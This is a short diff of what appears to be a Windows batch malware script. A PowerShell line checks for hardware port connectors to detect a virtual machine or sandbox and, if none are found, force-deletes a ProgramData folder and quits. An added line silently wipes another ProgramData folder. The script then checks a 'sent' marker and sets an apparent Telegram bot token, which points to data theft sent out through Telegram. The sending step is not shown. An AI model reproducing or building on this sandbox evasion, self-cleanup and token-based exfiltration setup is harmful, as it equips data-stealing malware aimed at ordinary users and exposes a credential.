@@ -1,4 +1,5 @@
 powershell.exe -NoProfile -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\Comms') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
+rd /s /q "%ProgramData%\ssc"
 if exist "%ProgramData%\sent" exit /b
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
